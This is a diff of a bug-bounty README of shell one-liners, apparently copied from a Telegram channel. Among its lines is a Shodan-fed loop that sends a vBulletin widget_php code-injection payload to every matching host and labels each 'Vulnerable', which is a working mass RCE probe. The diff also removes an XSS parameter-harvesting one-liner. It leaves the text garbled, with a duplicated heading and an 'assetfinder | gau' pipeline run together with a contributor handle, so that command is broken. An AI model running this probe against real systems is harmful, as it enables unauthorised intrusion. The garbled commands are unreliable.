@@ -1,9 +1,8 @@
-𝙇𝙤𝙨𝙩𝙨𝙚𝙘, [30-10-2024 07:23 AM]
-Awesome One-liner Bug Bounty :
+# Awesome One-liner Bug Bounty
 
-> A collection of awesome one-liner scripts especially for bug bounty.
+# A collection of awesome one-liner scripts especially for bug bounty.
 
-This repository stores and houses various one-liner for bug bounty tips provided by me as well as contributed by the community. Your contributions and suggestions are heartily♥ welcome.
+# This repository stores and houses various one-liner for bug bounty tips provided by me as well as contributed by the community. Your contributions and suggestions are heartily welcome.
 
 ## Definitions
 
@@ -59,12 +58,10 @@ cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2
 
 shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;
 ### Find JavaScript Files
+### Find JavaScript Files
 > @D0cK3rG33k
 
-𝙇𝙤𝙨𝙩𝙨𝙚𝙘, [30-10-2024 07:23 AM]
-assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done
-### Extract Endpoints from JavaScript
-> @renniepak
+assetfinder --subs-only HOST | gau> @renniepak
 
 cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
 ### Get CIDR & Org Information from Target Lists
